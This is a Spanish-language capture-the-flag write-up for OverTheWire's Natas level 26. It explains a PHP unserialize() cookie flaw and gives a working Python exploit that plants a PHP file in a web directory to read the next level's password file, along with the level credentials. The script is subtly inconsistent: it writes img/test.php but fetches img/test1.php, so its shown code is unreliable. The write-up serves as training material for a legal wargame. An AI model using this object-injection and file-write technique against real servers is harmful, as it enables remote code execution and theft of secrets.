# Natas 26

#### URL: natas26.natas.labs.overthewire.org
#### Credenciales: natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

Las coordenadas que escribimos en la imagen se guardan como un objeto serializado de PHP en la cookie "drawing" y es deserializado para su analisis en el servidor:
``` php
if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

Existe una clase Logger con un destructor que escribe en el archivo especificado en "logFile" el string almacenado en "exitMsg":
``` php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
```

Los destructores son clases que se llaman al final del ciclo de vida de un objeto, la idea para resolver este nivel es la siguiente:
+ Crear un objeto Logger con la propiedad logFile conteniendo un string a una ruta de archivo valido y la propiedad exitMsg conteniendo un script en php malicioso
+ Serializar el objeto y establecerlo como el valor de la cookie "drawing"
+ Hacer la peticion a la ruta de nuestro archivo para ejecutar el codigo PHP

Asumimos que la ruta /img es valida para escribir un archivo porque muestra el resultado de los dibujos como una imagen almacenada en dicha ruta.

``` python
import subprocess
import requests
from base64 import b64encode

# Codigo de php para serializar
phpCode='''class Logger {public $logFile; public $initMsg; public $exitMsg; } $logger = new Logger(); $logger->initMsg="STARTING ATTACK\n"; $logger->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n"; $logger->logFile = "/var/www/natas/natas26/img/test.php"; print base64_encode(serialize($logger))."\n";'''
# Ejecutar el codigo con el interprete de php
php = subprocess.run(["php","-r",phpCode],text=True,capture_output=True,check=True)
# Hacer la peticion
URL='http://natas26.natas.labs.overthewire.org'
headers = {'Authorization': f'Basic {b64encode(b"natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE").decode()}',
           'Cookie': f'drawing={php.stdout.strip()}'
          }
requests.get(URL,headers=headers)
r = requests.get(URL+'/img/test1.php',headers=headers)
print(r.text)
```

Cuando el servidor recibe la peticion con la cookie, la deserializa, y aunque produzca un error porque no es el tipo de objeto esperado igualmente el destructor se va a ejecutar al final del ciclo de vida del objeto.

``` bash 
python3 natas26_sploit.py
u3RRffXjysjgwFU6b9xa23i6prmUsYne
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

`natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne`
